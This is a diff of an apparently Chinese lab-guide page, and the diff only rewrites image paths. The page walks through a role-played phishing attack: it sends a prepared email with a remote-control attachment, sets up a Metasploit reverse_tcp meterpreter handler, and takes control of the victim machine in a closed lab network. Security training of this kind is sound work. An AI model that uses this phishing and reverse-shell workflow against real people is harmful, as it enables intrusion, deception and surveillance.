@@ -87,66 +87,66 @@
 <li>访问进入系统后，先关闭开启的终端窗口。</li>
 <li>打开系统自带的浏览器，并访问网址<code>172.16.12.12</code></li>
 </ol>
-<p><img src="https://i.loli.net/2021/10/31/OTLYBFZnzXQtmiS.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/OTLYBFZnzXQtmiS.png"></p>
 <ol start="3">
 <li>使用账户<code>hack@yaoshui.com</code>，密码<code>hack@123456</code>进行登陆</li>
 <li>登陆系统后在草稿箱中查看准备好的钓鱼邮件，将钓鱼邮件发送给<code>giaogiao</code>公司的<code>it</code>员工。</li>
 </ol>
-<p><img src="https://i.loli.net/2021/10/31/qAcEyQF9ClNIbhJ.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/qAcEyQF9ClNIbhJ.png"></p>
 <p>邮件中已经编写了钓鱼信息，诱导员工安装软件，并且进行一些言语上的引导。</p>
-<p><img src="https://i.loli.net/2021/10/31/x1BUaiQvMdHGfnP.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/x1BUaiQvMdHGfnP.png"></p>
 <p>在邮件的附件中，会加入远控的程序</p>
 <ol start="3">
 <li>点击发送就会将钓鱼邮件发送给被攻击者</li>
 </ol>
-<p><img src="https://i.loli.net/2021/10/31/jKLMCvtSZgdriVl.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/jKLMCvtSZgdriVl.png"></p>
 <h4 id="步骤2-扮演攻击者，启动远控程序，等待目标上线"><a href="#步骤2-扮演攻击者，启动远控程序，等待目标上线" class="headerlink" title="步骤2 扮演攻击者，启动远控程序，等待目标上线"></a>步骤2 扮演攻击者，启动远控程序，等待目标上线</h4><ol>
 <li>启动<code>Terminal</code>软件，在命令行输入<code>msfconsole</code>命令，并按回车。</li>
 </ol>
-<p><img src="mail%E9%92%93%E9%B1%BC.assets/image-20210605162744420.png" alt="image-20210605162744420"></p>
+<p><img src="mail%E9%92%93%E9%B1%BC.assets/image-20250605162744420.png" alt="image-20250605162744420"></p>
 <p>等待一段时间后即可进入<code>metasploit</code></p>
-<p><img src="https://i.loli.net/2021/10/31/FOG8lDCtHRLSMQX.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/FOG8lDCtHRLSMQX.png"></p>
 <ol start="2">
 <li>在msf的控制窗口中执行开启远控，等待目标上线，需要执行以下命令</li>
 </ol>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2021/10/31/ZDR8Eecrg2T3AXY.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/ZDR8Eecrg2T3AXY.png"></p>
 <h4 id="步骤3-扮演受害者，查看邮件并且点击了钓鱼程序"><a href="#步骤3-扮演受害者，查看邮件并且点击了钓鱼程序" class="headerlink" title="步骤3 扮演受害者，查看邮件并且点击了钓鱼程序"></a>步骤3 扮演受害者，查看邮件并且点击了钓鱼程序</h4><ol>
 <li>在终端中开启新的标签页</li>
 </ol>
-<p><img src="https://i.loli.net/2021/10/31/uUd1Ir7GmB8kaOs.png"></p>
+<p><img src="https://i.loli.net/2025/10/31/uUd1Ir7GmB8kaOs.png"></p>
 <ol start="2">
 <li>在新建的标签页中使用命令<code>redesktop -u me -p me 172.16.12.2</code>远程连接到giaogiao公司的it计算机，并且在输入提示中输入<code>yes</code></li>
 </ol>
-<p><img src="image-20210605165910141.png"></p>
+<p><img src="image-20250605165910141.png"></p>
 <ol start="3">
 <li>回车后就可连接到受害计算机，并且在新显示出来的计算机窗口中，点击最大化</li>
 </ol>
-<p><img src="image-20210605170103063.png"></p>
+<p><img src="image-20250605170103063.png"></p>
 <ol start="4">
 <li>点击桌面上的<code>foxmail</code>软件，可以进入到giaogiao公司的it员工的邮箱。it员工在收到邮件后，根据邮件的提示，下载了邮件的附件程序，并且双击进行运行。</li>
 </ol>
-<p><img src="image-20210605170353852.png"></p>
+<p><img src="image-20250605170353852.png"></p>
 <p>保存文件到桌面</p>
-<p><img src="image-20210605170653812.png"></p>
+<p><img src="image-20250605170653812.png"></p>
 <ol start="5">
 <li>在桌面上，解压<code>update.zip</code>并运行解压后的<code>update.exe</code></li>
 </ol>
-<p><img src="image-20210605171402049.png"></p>
-<p><img src="image-20210605171435312.png"></p>
-<p><img src="image-20210605171508885.png"></p>
+<p><img src="image-20250605171402049.png"></p>
+<p><img src="image-20250605171435312.png"></p>
+<p><img src="image-20250605171508885.png"></p>
 <h4 id="步骤4-扮演攻击者，在终端中可以控制目标计算机"><a href="#步骤4-扮演攻击者，在终端中可以控制目标计算机" class="headerlink" title="步骤4 扮演攻击者，在终端中可以控制目标计算机"></a>步骤4 扮演攻击者，在终端中可以控制目标计算机</h4><ol>
 <li>切换回kali中的终端<code>msfconsole</code>，此时就可以看到目标及其成功上线，可以在终端中查看目标系统信息。</li>
 </ol>
-<p><img src="image-20210605171703068.png"></p>
+<p><img src="image-20250605171703068.png"></p>
 <ol start="2">
 <li>在<code>meterpreter </code>中执行命令，可以控制目标计算机</li>
 </ol>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; screenshare</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="image-20210605171914603.png"></p>
-<p><img src="image-20210605172056455.png"></p>
+<p><img src="image-20250605171914603.png"></p>
+<p><img src="image-20250605172056455.png"></p>
 <blockquote>
 <p> 执行命令<code>sysinfo</code>用来查看目标操作系统信息</p>
 </blockquote>
